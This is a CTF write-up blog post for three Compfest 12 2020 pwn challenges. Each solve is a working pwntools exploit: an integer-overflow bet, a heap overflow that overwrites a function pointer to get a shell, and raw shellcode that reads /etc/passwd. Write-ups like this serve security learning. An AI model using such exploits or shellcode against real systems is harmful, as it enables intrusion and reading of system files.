---           
layout: post
title:  "Compfest 12 2020 CTF quals"
date:   2020-09-08
categories: ctf
description: Writeup Compfest 12 2020 CTF quals 
tags: ctf-writeup              
---

## Gambling Problem 2

### Description

dek depe menemukan service judi onlen dari forum *redacted*. Karena service judi online ini baru buka, pengguna diberikan uang untuk memulai karir perjudian. Setelah diberi bin file lewat orang dalem, dek depe menyadari ternyata terdapat bug mematikan dalam program tersebut. Bantulah dek depe memanfaatkan exploit tersebut!

nc 128.199.157.172 25880

### Solve

to solve this challenge we need to have money at least 0xdeadbeef or 3735928559 in decimal. we can 
get more money on `gameTime()` function.

<img src="/images/compfest2020/pseudo.png" />

to get more money, we have to place our bet on `gameTime()` function if we can guess a random number
we can get 5 times from our stake, there is also format string bug on input bet

<img src="/images/compfest2020/fmtstr.png" />

but I prefer to use another bug, which can easy to exploit lol.

<img src="/images/compfest2020/otherbug.png" />

there is an integer overflow in `-5 * taruhan` we can still increase our money even we guess the wrong number.
my exploit:

{% highlight python %}

from pwn import *
r = remote('128.199.157.172',25880)

r.sendlineafter(":","1")
r.sendlineafter(":",'1')
r.sendlineafter(":",str(0xffffff))
r.sendlineafter(":",'1')
r.sendlineafter(":",'0')
r.sendlineafter(":",'2')
r.sendlineafter(":",'1')
# r.sendlineafter(":",str(0xbeefbeef))
r.interactive()

{% endhighlight %}

<img src="/images/compfest2020/flag-1.png" />

FLAG: COMPFEST12{laptop_pembuat_soalnya_BSOD_so_this_is_Zafirr_again_lol_39cbc5}

## Binary Exploitation is Ez

## Description

Take a break, here's an easy problem

nc 128.199.157.172 23170

## Solve

this is an easy challenge, there is buffer overflow in `edit_mem()`.

<img src="/images/compfest2020/bug1.png" />

and `my_print()` is stored on the heap that close to our input

<img src="/images/compfest2020/bug2.png" />

in `print_meme()` function, `my_print()` is being called to print our
content from heap

<img src="/images/compfest2020/functionbug.png" />

so, we can use buffer overflow in `edit_mem()` to overwrite `my_print()` with `EZ_WIN()` function
and then call `print_mem()`, so that we can get a shell

my exploit:

{% highlight python %}
#!/usr/bin/env python2
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/compfest2020/binex/binex-is-easy/ez")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def newMeme(size,con):
    r.sendlineafter(":",'1')
    r.sendlineafter(':',str(size))
    r.sendlineafter(':',str(con))

def editMeme(idx,con):
    r.sendlineafter(":",'2')
    r.sendlineafter(':',str(idx))
    r.sendlineafter(':',str(con))

def printMeme(idx):
    r.sendlineafter(":",'3')
    r.sendlineafter(':',str(idx))

def exploit(r):
    # attach(r)
    win = 0x00000000004014a0
    p = ("A" * 8) * 3
    p += p64(0x21)
    p += p64(win)
    newMeme(10,"BBBBBBBB")
    newMeme(10,"C"*8)
    newMeme(10,"D"*8)
    editMeme(0,p)
    newMeme(10,"IIIIIIII")

    r.sendline("3")
    r.sendline("1")
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("128.199.157.172", 23170)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)

{% endhighlight %}

<img src="/images/compfest2020/flag3.png" />

FLAG: COMPFEST12{C_i_told_u_its_ez_loooooooool_257505}

## Sandbox King

### Description

You have to get a shell. The seccomp is easy to bypass right?

nc 128.199.104.41 25171

### Solve

according to the pseudocode 

<img src="/images/compfest2020/pseudo0.png" />

we can just send a shellcode to get a shell. 

my exploit:

{% highlight python %}

from pwn import *

r = remote("128.199.104.41",25171)

sh = "\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
r.sendline(sh)
r.interactive()

{% endhighlight %}

<img src="/images/compfest2020/flag4.png" />

FLAG: COMPFEST12{C0nGr4TTSSS_U_r_D_SssssssssAnd60X_K111ng9g99_1c7dbf}

